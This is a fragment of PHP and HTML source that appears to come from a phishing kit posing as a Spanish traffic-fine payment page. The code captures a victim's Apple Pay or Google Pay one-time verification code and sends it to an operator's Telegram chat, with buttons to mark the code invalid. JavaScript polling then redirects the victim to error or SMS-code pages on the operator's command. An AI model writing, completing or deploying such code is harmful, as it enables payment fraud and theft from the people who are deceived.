...
if (!empty($_POST['vbv_code'])) {
    ...
    $keyboard = [
        'inline_keyboard' => [
            [['text' => '❌ | Invalide code apple', 'callback_data' => 'invalide_apple']],
    ...
    $telegram->sendMessage([
        'chat_id' => $chat_rez,
        'text' => "
        [📜] OTP APPLE | 🇪🇸 Amende Espagne                    

        [📜] OTP Apple/Gpay : {$_SESSION['vbv_code']}        
    ...
    $error = true;
    header("Location: ../user/sms_auth.php?error=1");
    exit;
}
?>
...
<html>
<head>
    <!-- Mettez ici vos balises meta, titres, styles CSS, etc. -->
</head>
<body>
    <?php if ($step == 1):
        if ($error): ?>
            ...
            setInterval(function () {
                $.ajax({
                    ...
                    success: function (msg) {
                        if (msg === 'invalide_apple') {
                            window.location.href = '../user/sms_auth.php?error=1';
                        } else if (msg === 'otp_sms') {
